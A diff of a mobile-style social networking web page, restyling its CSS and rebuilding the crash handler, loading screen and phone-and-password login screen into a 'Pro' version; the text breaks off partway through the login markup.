@@ -4,879 +4,456 @@
     <meta charset="UTF-8">
     <!-- 
       ========================================================================
-      PROJECT: Premium Community App
+      PROJECT: Premium Community App (PRO VERSION)
       DEVELOPER: Roni Vai
       COUNTRY: Made in Bangladesh 🇧🇩
       ========================================================================
     -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Community App - Developer by Roni Vai</title>
+    <title>Community App - Pro</title>
     
     <!-- 🚨 CRASH DETECTOR -->
     <script>
         window.onerror = function(message, source, lineno, colno, error) {
-            var errDiv = document.createElement('div');
-            errDiv.style.cssText = 'position:fixed; top:0; left:0; width:100%; height:100%; background:white; color:red; z-index:999999; padding:20px; font-family:sans-serif; overflow-y:auto;';
-            errDiv.innerHTML = '<h2 style="color:red; border-bottom:2px solid red; padding-bottom:10px;">🚨 APP CRASHED!</h2>' +
-                               '<p style="color:black; font-weight:bold;">Please send this screenshot to Roni Vai:</p>' +
-                               '<b style="color:red;">Error Message:</b> ' + message + '<br><br>' +
-                               '<b style="color:blue;">Line Number:</b> ' + lineno + ' | <b style="color:blue;">Column:</b> ' + colno + '<br><br>' +
-                               '<b style="color:black;">Error Details:</b><br><pre style="font-size:12px; color:#333; background:#eee; padding:10px; border-radius:5px;">' + 
-                               (error && error.stack ? error.stack : 'No stack trace available') + '</pre>';
-            document.body.appendChild(errDiv);
+            console.error("App Error: ", message);
             return true;
         };
     </script>
 
-    <!-- Google Fonts for Modern UI -->
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <!-- Modern Premium Font (Inter) -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     
     <!-- FontAwesome Icons -->
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
 
-    <!-- CSS VARIABLES & STYLES -->
+    <!-- PRO UI/UX CSS -->
     <style>
         :root {
-            --primary-color: #0866ff; 
-            --primary-hover: #075ce5;
-            --background-gray: #f0f2f5;
-            --white-color: #ffffff;
-            --text-main: #050505;
+            --primary: #1877f2; /* Professional Blue */
+            --primary-hover: #166fe5;
+            --bg-color: #f0f2f5;
+            --surface: #ffffff;
+            --text-dark: #050505;
             --text-muted: #65676b;
-            --danger-color: #e41e3f;
-            --border-color: #ced0d4;
-            --success-color: #16a34a;
+            --border: #ced0d4;
+            --danger: #e41e3f;
+            --success: #31a24c;
+            --radius-md: 12px;
+            --radius-lg: 20px;
+            --shadow-sm: 0 2px 4px rgba(0,0,0,0.05);
+            --shadow-md: 0 4px 12px rgba(0,0,0,0.08);
         }
 
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Roboto', sans-serif;
+            font-family: 'Inter', sans-serif;
             -webkit-tap-highlight-color: transparent;
         }
 
         body {
-            background-color: var(--background-gray);
-            color: var(--text-main);
+            background-color: var(--bg-color);
+            color: var(--text-dark);
             height: 100vh;
             width: 100vw;
             overflow: hidden;
             display: flex;
-            flex-direction: column;
+            justify-content: center;
+        }
+
+        /* Mobile Container for PC viewing */
+        .app-container {
+            width: 100%;
+            max-width: 500px;
+            height: 100%;
+            background-color: var(--bg-color);
             position: relative;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            box-shadow: var(--shadow-md);
         }
 
-        .hidden {
-            display: none !important;
+        .hidden { display: none !important; }
+
+        /* Smooth Screen Transitions */
+        .screen {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            display: flex;
+            flex-direction: column;
+            background-color: var(--bg-color);
+            z-index: 10;
+            animation: slideFadeIn 0.3s ease forwards;
+            overflow-y: auto;
         }
 
+        @keyframes slideFadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Premium Buttons */
         .btn {
-            padding: 12px 18px;
+            padding: 14px 20px;
             border: none;
-            border-radius: 8px;
+            border-radius: var(--radius-md);
+            font-size: 16px;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.2s ease;
             display: flex;
+            align-items: center;
             justify-content: center;
-            align-items: center;
-            gap: 8px;
-            font-size: 15px;
-        }
-
-        .btn:active {
-            transform: scale(0.96);
-        }
-        
-        .btn:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-        }
-
-        .btn-primary {
-            background-color: var(--primary-color);
-            color: var(--white-color);
-            width: 100%;
-        }
-
-        .btn-primary:hover {
-            background-color: var(--primary-hover);
-        }
-
-        .btn-secondary {
-            background-color: #e4e6eb;
-            color: var(--text-main);
-        }
-
-        .btn-danger {
-            background-color: #fee2e2;
-            color: var(--danger-color);
-            padding: 8px 16px;
-        }
-
-        input[type="text"], 
-        input[type="password"],
-        textarea {
-            width: 100%;
-            padding: 14px;
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            outline: none;
-            font-size: 15px;
-            background-color: var(--white-color);
-            transition: border-color 0.2s ease;
-        }
-
-        input[type="text"]:focus, 
-        input[type="password"]:focus,
-        textarea:focus {
-            border-color: var(--primary-color);
-        }
-
-        .screen {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            display: flex;
-            flex-direction: column;
-            background-color: var(--background-gray);
-            z-index: 10;
-            overflow: hidden;
-            animation: fadeIn 0.4s ease-in-out;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        .content-area {
-            flex: 1;
-            overflow-y: auto;
-            padding-bottom: 80px; 
-        }
-
-        .top-header {
-            background-color: var(--white-color);
-            height: 65px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 0 15px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
-            z-index: 50;
-            position: sticky;
-            top: 0;
-        }
-
-        .logo {
-            font-size: 24px;
-            font-weight: 700;
-            color: var(--primary-color);
-        }
-
-        .header-actions {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .icon-btn {
-            width: 42px;
-            height: 42px;
-            border-radius: 50%;
-            background-color: #e4e6eb;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-size: 20px;
-            cursor: pointer;
-            color: var(--text-main);
-        }
-
-        .search-bar {
-            background-color: var(--background-gray);
-            border-radius: 25px;
-            padding: 10px 15px;
-            display: flex;
-            align-items: center;
             gap: 10px;
-            width: 200px;
+            width: 100%;
         }
 
-        .search-bar input {
-            border: none;
-            background: transparent;
-            padding: 0;
-            font-size: 15px;
-        }
+        .btn:active { transform: scale(0.97); }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
 
-        .dropdown-menu {
-            position: absolute;
-            top: 70px;
-            background-color: var(--white-color);
-            box-shadow: 0 5px 20px rgba(0,0,0,0.15);
-            border-radius: 10px;
-            z-index: 100;
-            max-height: 400px;
-            overflow-y: auto;
-            display: none;
-            padding: 10px;
-        }
+        .btn-primary { background-color: var(--primary); color: white; box-shadow: 0 4px 10px rgba(24, 119, 242, 0.3); }
+        .btn-primary:hover { background-color: var(--primary-hover); }
+        
+        .btn-secondary { background-color: #e4e6eb; color: var(--text-dark); }
+        .btn-danger { background-color: #fee2e2; color: var(--danger); }
 
-        #search-results {
-            left: 15px;
-            width: calc(100% - 30px);
+        /* Premium Inputs */
+        .input-group { position: relative; margin-bottom: 16px; }
+        .input-group i { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); color: var(--text-muted); font-size: 18px; }
+        .input-field {
+            width: 100%; padding: 16px 16px 16px 45px;
+            border: 1.5px solid #e5e7eb; border-radius: var(--radius-md);
+            font-size: 15px; outline: none; background: #f9fafb;
+            transition: all 0.3s ease;
         }
+        .input-field:focus { border-color: var(--primary); background: white; box-shadow: 0 0 0 4px rgba(24,119,242,0.1); }
 
-        #notif-dropdown {
-            right: 15px;
-            width: 320px;
-        }
-
-        .fb-create-post-card {
-            background-color: var(--white-color);
-            padding: 15px;
-            margin-bottom: 12px;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
-        }
-
-        .fb-create-top {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            border-bottom: 1px solid var(--background-gray);
-            padding-bottom: 15px;
-            margin-bottom: 15px;
-        }
-
-        .fb-create-top img {
-            width: 45px;
-            height: 45px;
-            border-radius: 50%;
-            object-fit: cover;
-            border: 1px solid var(--border-color);
-        }
-
-        .fb-dummy-input {
-            flex: 1;
-            background-color: var(--background-gray);
+        /* Top Header */
+        .top-header {
+            background: var(--surface);
             padding: 12px 20px;
-            border-radius: 25px;
-            color: var(--text-muted);
-            cursor: pointer;
-            font-size: 16px;
+            display: flex; justify-content: space-between; align-items: center;
+            box-shadow: var(--shadow-sm);
+            position: sticky; top: 0; z-index: 50;
         }
-
-        .fb-create-actions {
-            display: flex;
-            justify-content: space-around;
+        .logo { font-size: 26px; font-weight: 800; color: var(--primary); letter-spacing: -0.5px; }
+        
+        .header-actions { display: flex; gap: 12px; align-items: center; }
+        .icon-btn {
+            width: 40px; height: 40px; border-radius: 50%;
+            background: #f0f2f5; display: flex; justify-content: center; align-items: center;
+            font-size: 18px; color: var(--text-dark); cursor: pointer; transition: 0.2s;
         }
+        .icon-btn:active { background: #e4e6eb; }
 
-        .fb-action {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            color: var(--text-muted);
-            font-weight: 600;
-            cursor: pointer;
-            font-size: 15px;
-            padding: 10px;
-            border-radius: 8px;
-            flex: 1;
-            justify-content: center;
+        /* Feed & Posts */
+        .content-area { flex: 1; padding-bottom: 80px; overflow-y: auto; }
+
+        .create-post-card {
+            background: var(--surface); padding: 16px; margin-bottom: 10px;
+            box-shadow: var(--shadow-sm);
         }
-
-        #post-modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: var(--white-color);
-            z-index: 200;
-            display: flex;
-            flex-direction: column;
-            transform: translateY(100%);
-            transition: transform 0.3s ease;
+        .create-post-top { display: flex; gap: 12px; align-items: center; margin-bottom: 12px; }
+        .create-post-top img { width: 44px; height: 44px; border-radius: 50%; object-fit: cover; }
+        .dummy-input {
+            flex: 1; background: var(--bg-color); padding: 12px 20px;
+            border-radius: 30px; color: var(--text-muted); font-size: 15px; cursor: pointer;
         }
-
-        #post-modal.show {
-            transform: translateY(0);
-        }
-
-        .pm-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 15px 20px;
-            border-bottom: 1px solid var(--border-color);
-        }
-
-        .pm-textarea {
-            width: 100%;
-            border: none;
-            font-size: 20px;
-            outline: none;
-            resize: none;
-            min-height: 150px;
-            padding: 20px;
-        }
-
-        .add-to-post {
-            border: 1px solid var(--border-color);
-            border-radius: 10px;
-            padding: 15px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin: 20px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        .create-actions { display: flex; border-top: 1px solid var(--border); padding-top: 12px; }
+        .action-item {
+            flex: 1; display: flex; justify-content: center; align-items: center; gap: 8px;
+            color: var(--text-muted); font-weight: 600; font-size: 14px; padding: 8px; border-radius: var(--radius-md); cursor: pointer;
         }
 
         .post-card {
-            background-color: var(--white-color);
-            margin-bottom: 12px;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
-            padding: 15px 15px 5px;
+            background: var(--surface); margin-bottom: 10px; padding: 16px;
+            box-shadow: var(--shadow-sm);
         }
+        .post-header { display: flex; gap: 12px; margin-bottom: 12px; }
+        .post-header img { width: 44px; height: 44px; border-radius: 50%; object-fit: cover; }
+        .post-name { font-weight: 700; font-size: 15px; color: var(--text-dark); }
+        .post-time { font-size: 12px; color: var(--text-muted); margin-top: 2px; }
+        .post-text { font-size: 15px; line-height: 1.5; margin-bottom: 12px; color: #1c1e21; white-space: pre-wrap; }
+        .post-image { width: calc(100% + 32px); margin-left: -16px; max-height: 400px; object-fit: cover; margin-bottom: 12px; }
+        
+        .post-stats { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid var(--border); font-size: 14px; color: var(--text-muted); }
+        .post-actions-bar { display: flex; padding-top: 8px; }
+        .post-btn { flex: 1; text-align: center; padding: 8px; color: var(--text-muted); font-weight: 600; font-size: 14px; border-radius: var(--radius-md); cursor: pointer; }
+        .post-btn:active { background: var(--bg-color); }
+        .post-btn i { margin-right: 6px; }
 
-        .post-header {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 12px;
-        }
-
-        .post-header img {
-            width: 45px;
-            height: 45px;
-            border-radius: 50%;
-            object-fit: cover;
-            margin-right: 12px;
-        }
-
-        .post-name {
-            font-weight: 600;
-            font-size: 16px;
-            color: var(--text-main);
-        }
-
-        .post-time {
-            font-size: 13px;
-            color: var(--text-muted);
-            margin-top: 2px;
-        }
-
-        .post-text {
-            font-size: 16px;
-            margin-bottom: 12px;
-            line-height: 1.5;
-        }
-
-        .post-image {
-            width: calc(100% + 30px);
-            margin-left: -15px;
-            max-height: 450px;
-            object-fit: cover;
-            margin-bottom: 12px;
-        }
-
-        .gps-tag {
-            font-size: 13px;
-            color: var(--primary-color);
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            font-weight: 500;
-        }
-
-        .post-stats {
-            display: flex;
-            justify-content: space-between;
-            padding: 12px 0;
-            border-bottom: 1px solid var(--background-gray);
-            color: var(--text-muted);
-            font-size: 14px;
-        }
-
-        .post-actions {
-            display: flex;
-            justify-content: space-around;
-            padding: 5px 0;
-        }
-
-        .post-action-btn {
-            flex: 1;
-            text-align: center;
-            padding: 10px;
-            color: var(--text-muted);
-            font-weight: 600;
-            cursor: pointer;
-            border-radius: 8px;
-            font-size: 15px;
-        }
-
-        .profile-cover {
-            width: 100%;
-            height: 200px;
-            background: linear-gradient(135deg, #dbeafe, #93c5fd);
-            position: relative;
-        }
-
-        .profile-pic-large {
-            width: 140px;
-            height: 140px;
-            border-radius: 50%;
-            border: 5px solid var(--white-color);
-            position: absolute;
-            bottom: -50px;
-            left: 20px;
-            object-fit: cover;
-            background: var(--white-color);
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-
-        .profile-details {
-            padding: 60px 20px 20px;
-            background-color: var(--white-color);
-            margin-bottom: 12px;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
-        }
-
-        #settings-modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: var(--background-gray);
-            z-index: 150;
-            transform: translateX(100%);
-            transition: transform 0.3s ease;
-            display: flex;
-            flex-direction: column;
-        }
-
-        #settings-modal.show {
-            transform: translateX(0);
-        }
-
-        .settings-header {
-            background-color: var(--white-color);
-            padding: 15px 20px;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            font-size: 20px;
-            font-weight: 700;
-            border-bottom: 1px solid var(--border-color);
-        }
-
-        .settings-card {
-            background-color: var(--white-color);
-            margin: 15px;
-            padding: 20px;
-            border-radius: 12px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-        }
-
-        .made-in-bd {
-            text-align: center;
-            padding: 40px 20px;
-            font-size: 15px;
-            font-weight: 700;
-            color: var(--success-color);
-            letter-spacing: 1px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 10px;
-            text-transform: uppercase;
-        }
-
+        /* Bottom Navigation */
         .bottom-nav {
-            background-color: var(--white-color);
-            display: flex;
-            justify-content: space-around;
-            padding: 12px 0;
-            border-top: 1px solid var(--border-color);
-            position: fixed;
-            bottom: 0;
-            width: 100%;
-            z-index: 50;
+            background: var(--surface); display: flex; justify-content: space-around;
+            padding: 12px 0; border-top: 1px solid var(--border);
+            position: absolute; bottom: 0; width: 100%; z-index: 50;
+            padding-bottom: max(12px, env(safe-area-inset-bottom));
         }
-
         .nav-item {
-            font-size: 26px;
-            color: var(--text-muted);
-            cursor: pointer;
-            padding: 5px 30px;
-            border-radius: 10px;
-            transition: color 0.2s;
+            font-size: 24px; color: #B0B3B8; cursor: pointer; padding: 8px 24px; border-radius: var(--radius-lg); transition: 0.3s;
+        }
+        .nav-item.active { color: var(--primary); background: rgba(24, 119, 242, 0.1); }
+
+        /* Modals & Dropdowns */
+        .dropdown {
+            position: absolute; top: 60px; right: 15px; width: 320px; max-height: 400px; overflow-y: auto;
+            background: var(--surface); box-shadow: var(--shadow-md); border-radius: var(--radius-md);
+            z-index: 100; display: none; padding: 12px; border: 1px solid var(--border);
         }
 
-        .nav-item.active {
-            color: var(--primary-color);
+        .full-modal {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: var(--surface); z-index: 200; display: flex; flex-direction: column;
+            transform: translateY(100%); transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         }
+        .full-modal.show { transform: translateY(0); }
+        .modal-header { display: flex; justify-content: space-between; align-items: center; padding: 16px; border-bottom: 1px solid var(--border); }
 
+        /* Profile Screen */
+        .profile-cover { width: 100%; height: 180px; background: linear-gradient(135deg, #a1c4fd, #c2e9fb); position: relative; }
+        .profile-pic-large {
+            width: 130px; height: 130px; border-radius: 50%; border: 4px solid var(--surface);
+            position: absolute; bottom: -65px; left: 50%; transform: translateX(-50%); object-fit: cover; background: white;
+        }
+        .profile-info { padding: 80px 20px 20px; background: var(--surface); text-align: center; margin-bottom: 10px; }
+        .profile-name { font-size: 26px; font-weight: 800; margin-bottom: 5px; }
+        .profile-stats { display: flex; justify-content: center; gap: 40px; margin: 20px 0; }
+        .stat-box { text-align: center; }
+        .stat-num { font-size: 20px; font-weight: 700; color: var(--text-dark); }
+        .stat-lbl { font-size: 13px; color: var(--text-muted); }
+
+        /* Divider */
+        .divider { display: flex; align-items: center; text-align: center; margin: 24px 0; color: #9ca3af; font-size: 14px; font-weight: 500; }
+        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #e5e7eb; }
+        .divider::before { margin-right: 15px; } .divider::after { margin-left: 15px; }
+
+        /* AI Cat CSS (Kept as requested) */
         #ai-cat-btn {
-            position: fixed;
-            bottom: 90px;
-            right: 20px;
-            z-index: 90;
-            cursor: pointer;
+            position: fixed; bottom: 80px; right: 20px; z-index: 90; cursor: pointer;
             animation: floatCat 3s infinite ease-in-out;
         }
-
-        @keyframes floatCat {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-12px); }
-        }
-
-        .cat-head {
-            width: 55px;
-            height: 50px;
-            background-color: #ffffff;
-            border: 2px solid #333333;
-            border-radius: 50% 50% 40% 40%;
-            position: relative;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-            display: flex;
-            justify-content: center;
-        }
-
-        .ear-l, .ear-r {
-            position: absolute;
-            top: -10px;
-            width: 0;
-            height: 0;
-            border-left: 12px solid transparent;
-            border-right: 12px solid transparent;
-            border-bottom: 18px solid #333333;
-        }
-
-        .ear-l::after, .ear-r::after {
-            content: '';
-            position: absolute;
-            top: 4px;
-            border-left: 7px solid transparent;
-            border-right: 7px solid transparent;
-            border-bottom: 12px solid #f9a8d4; 
-        }
-
-        .ear-l { left: -3px; transform: rotate(-22deg); }
-        .ear-l::after { left: -7px; }
-        .ear-r { right: -3px; transform: rotate(22deg); }
-        .ear-r::after { left: -7px; }
-
-        .eye {
-            width: 10px;
-            height: 10px;
-            background-color: #333333;
-            border-radius: 50%;
-            position: absolute;
-            top: 20px;
-            animation: catBlink 4s infinite;
-        }
-
-        @keyframes catBlink {
-            0%, 96%, 98%, 100% { transform: scaleY(1); }
-            97%, 99% { transform: scaleY(0.1); }
-        }
-
-        .eye-l { left: 12px; }
-        .eye-r { right: 12px; }
-
-        .nose {
-            width: 8px;
-            height: 5px;
-            background-color: #f472b6;
-            border-radius: 50%;
-            position: absolute;
-            top: 30px;
-        }
-        
-        .divider {
-            display: flex;
-            align-items: center;
-            text-align: center;
-            margin: 25px 0;
-            color: var(--text-muted);
-            font-size: 14px;
-            font-weight: 500;
-        }
-        
-        .divider::before, .divider::after {
-            content: '';
-            flex: 1;
-            border-bottom: 1px solid var(--border-color);
-        }
-        
-        .divider::before { margin-right: 15px; }
-        .divider::after { margin-left: 15px; }
-
+        @keyframes floatCat { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        .cat-head { width: 50px; height: 45px; background: white; border: 2px solid #333; border-radius: 50% 50% 40% 40%; position: relative; box-shadow: var(--shadow-md); display: flex; justify-content: center; }
+        .ear-l, .ear-r { position: absolute; top: -10px; width: 0; height: 0; border-left: 10px solid transparent; border-right: 10px solid transparent; border-bottom: 15px solid #333; }
+        .ear-l::after, .ear-r::after { content: ''; position: absolute; top: 4px; border-left: 6px solid transparent; border-right: 6px solid transparent; border-bottom: 10px solid #f9a8d4; }
+        .ear-l { left: -2px; transform: rotate(-22deg); } .ear-l::after { left: -6px; }
+        .ear-r { right: -2px; transform: rotate(22deg); } .ear-r::after { left: -6px; }
+        .eye { width: 8px; height: 8px; background: #333; border-radius: 50%; position: absolute; top: 18px; animation: catBlink 4s infinite; }
+        @keyframes catBlink { 0%, 96%, 98%, 100% { transform: scaleY(1); } 97%, 99% { transform: scaleY(0.1); } }
+        .eye-l { left: 12px; } .eye-r { right: 12px; }
+        .nose { width: 6px; height: 4px; background: #f472b6; border-radius: 50%; position: absolute; top: 26px; }
     </style>
 </head>
 <body>
-
-    <!-- ========================================================================
-         INITIAL LOADING SCREEN 
-         ======================================================================== -->
-    <div id="loading-screen" class="screen" style="justify-content: center; align-items: center; background-color: var(--white-color); z-index: 300;">
-        <i class="fas fa-circle-notch fa-spin" style="font-size: 60px; color: var(--primary-color); margin-bottom: 20px;"></i>
-        <h2 style="font-size: 24px; font-weight: 700; color: var(--text-main);">Community</h2>
-        <p style="color: var(--text-muted); margin-top: 10px;">Authenticating...</p>
-    </div>
-
-    <!-- ========================================================================
-         ONBOARDING SCREEN
-         ======================================================================== -->
-    <div id="onboarding-screen" class="screen hidden" style="justify-content: center; align-items: center; padding: 30px; text-align: center; background-color: var(--white-color);">
-        <i class="fas fa-globe-americas" style="font-size: 90px; color: var(--primary-color); margin-bottom: 40px;"></i>
-        <h2 style="font-size: 28px; font-weight: 700; color: var(--text-main);">Welcome to Community</h2>
-        <p style="color: var(--text-muted); margin: 20px 0 40px; font-size: 16px; line-height: 1.6;">
-            Connect with friends, share your location, explore trending posts, and interact safely.
-        </p>
-        <button class="btn btn-primary" onclick="appUI.switchScreen('login')" style="padding: 15px; font-size: 18px;">
-            Get Started
-        </button>
-        <button class="btn" style="background: transparent; color: var(--primary-color); margin-top: 15px; font-size: 16px;" onclick="appUI.switchScreen('login')">
-            Skip Intro
-        </button>
-    </div>
-
-    <!-- ========================================================================
-         LOGIN SCREEN (UPDATE: ADDED PHONE + PASSWORD LOGIN)
-         ======================================================================== -->
-    <div id="login-screen" class="screen hidden" style="justify-content: center; padding: 30px; background-color: var(--white-color); overflow-y: auto;">
+    <div class="app-container">
         
-        <div style="text-align: center; margin-bottom: 30px;">
-            <h2 style="color: var(--primary-color); font-size: 34px; margin-bottom: 10px; font-weight: 700;">Sign In</h2>
-            <p style="color: var(--text-muted); font-size: 15px;">Create an account or log in to continue</p>
-        </div>
-        
-        <div style="width: 100%; max-width: 320px; margin: 0 auto;">
-            <!-- Mobile Number & Password Login -->
-            <input type="text" id="login-phone" placeholder="Phone Number (e.g. 017...)" style="margin-bottom: 15px;" autocomplete="off">
-            <input type="password" id="login-pass" placeholder="Password (Min 6 characters)" style="margin-bottom: 20px;">
-            
-            <button class="btn btn-primary" id="btn-phone-login" style="padding: 14px; font-size: 16px; border-radius: 24px;">
-                Login / Sign Up
-            </button>
-            
-            <div class="divider">OR</div>
-
-            <!-- Google Login Button -->
-            <button id="btn-google-login" style="background-color: #ffffff; color: #3c4043; width: 100%; border: 1px solid #dadce0; border-radius: 24px; padding: 12px 24px; font-size: 16px; font-weight: 500; display: flex; align-items: center; justify-content: center; gap: 12px; box-shadow: 0 1px 2px rgba(60,64,67,0.3); transition: background-color 0.2s, box-shadow 0.2s; cursor: pointer;">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" style="width: 24px; height: 24px;">
-                    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
-                    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
-                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
-                    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
-                    <path fill="none" d="M0 0h48v48z"/>
-                </svg>
-                Continue with Google
-            </button>
-        </div>
-        
-        <p id="login-status" style="margin-top: 25px; text-align: center; color: var(--primary-color); font-weight: bold;"></p>
-    </div>
-
-    <!-- ========================================================================
-         MAIN APP INTERFACE
-         ======================================================================== -->
-    <div id="main-app-screen" class="screen hidden">
-        
-        <!-- TOP HEADER -->
-        <div class="top-header">
-            <div class="logo">Community</div>
-            <div class="header-actions">
-                <div class="search-bar">
-                    <i class="fas fa-search" style="color: var(--text-muted);"></i>
-                    <input type="text" id="search-input" placeholder="Search people...">
-                </div>
-                <div class="icon-btn" onclick="appUI.toggleInbox()" title="Notifications">
-                    <i class="fas fa-bell"></i>
-                </div>
-            </div>
-
-            <div id="search-results" class="dropdown-menu"></div>
-            
-            <div id="notif-dropdown" class="dropdown-menu">
-                <h4 style="margin-bottom: 12px; border-bottom: 1px solid var(--border-color); padding-bottom: 12px;">Notifications</h4>
-                <div id="notifications-container"></div>
+        <!-- 1. LOADING SCREEN -->
+        <div id="loading-screen" class="screen" style="justify-content: center; align-items: center; background: var(--surface); z-index: 300;">
+            <div style="text-align: center;">
+                <div style="width: 70px; height: 70px; border: 4px solid #e5e7eb; border-top: 4px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
+                <h2 style="font-size: 24px; font-weight: 800; color: var(--text-dark);">Community</h2>
+                <p style="color: var(--text-muted); font-size: 15px; margin-top: 5px;">Connecting...</p>
             </div>
         </div>
+        <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
 
-        <!-- FEED TAB -->
-        <div id="tab-feed" class="content-area">
-            <div class="fb-create-post-card">
-                <div class="fb-create-top">
-                    <img src="https://via.placeholder.com/45" id="feed-avatar" alt="Avatar">
-                    <div class="fb-dummy-input" onclick="appUI.openPostModal()">What's on your mind?</div>
+        <!-- 2. PREMIUM LOGIN SCREEN -->
+        <div id="login-screen" class="screen hidden" style="background: var(--surface); padding: 40px 24px; justify-content: center;">
+            <div style="text-align: center; margin-bottom: 40px;">
+                <div style="background: rgba(24, 119, 242, 0.1); width: 80px; height: 80px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;">
+                    <i class="fas fa-users" style="font-size: 36px; color: var(--primary);"></i>
                 </div>
-                <div class="fb-create-actions">
-                    <div class="fb-action" onclick="appUI.openPostModal()">
-                        <i class="fas fa-image" style="color: #45bd62; font-size: 20px;"></i> Photo
-                    </div>
-                    <div class="fb-action" onclick="appUI.openPostModal()">
-                        <i class="fas fa-map-marker-alt" style="color: #f5533d; font-size: 20px;"></i> Location
-                    </div>
-                </div>
-            </div>
-
-            <div id="feed-container">
-                <div style="text-align: center; margin-top: 40px; color: var(--text-muted);">
-                    <i class="fas fa-circle-notch fa-spin fa-3x"></i>
-                    <p style="margin-top: 15px;">Loading amazing posts...</p>
-                </div>
-            </div>
-        </div>
-
-        <!-- PROFILE TAB -->
-        <div id="tab-profile" class="content-area hidden">
-            <div class="profile-cover">
-                <img src="https://via.placeholder.com/150" id="prof-pic-main" class="profile-pic-large" alt="Profile Picture">
+                <h1 style="font-size: 32px; font-weight: 800; color: var(--text-dark); margin-bottom: 8px;">Welcome Back</h1>
+                <p style="color: var(--text-muted); font-size: 15px;">Log in or create a new account.</p>
             </div>
             
-            <div class="profile-details">
-                <h2 id="prof-name-main" style="font-size: 28px; margin-bottom: 8px; font-weight: 700;">Loading User...</h2>
-                <p id="prof-phone-main" style="color: var(--text-muted); margin-bottom: 20px; font-size: 16px;">Phone Number Loading...</p>
-                
-                <div style="display: flex; gap: 30px; font-weight: 600; margin-bottom: 25px; font-size: 18px;">
-                    <div><span id="stat-posts" style="font-size: 20px;">0</span> Posts</div>
-                    <div><span id="stat-followers" style="font-size: 20px;">0</span> Followers</div>
+            <div style="width: 100%; max-width: 350px; margin: 0 auto;">
+                <div class="input-group">
+                    <i class="fas fa-phone-alt"></i>
+                    <input type="text" id="login-phone" class="input-field" placeholder="Phone Number (e.g. 017...)" autocomplete="off">
+                </div>
+                <div class="input-group">
+                    <i class="fas fa-lock"></i>
+                    <input type="password" id="login-pass" class="input-field" placeholder="Password (Min 6 chars)">
                 </div>
                 
-                <button class="btn btn-secondary" style="width: 100%; padding: 14px; font-size: 16px;" onclick="appUI.openSettings()">
-                    <i class="fas fa-pen"></i> Edit Profile & Settings
+                <button class="btn btn-primary" id="btn-phone-login" style="margin-top: 10px;">
+                    Login / Sign Up
+                </button>
+                
+                <div class="divider">OR</div>
+
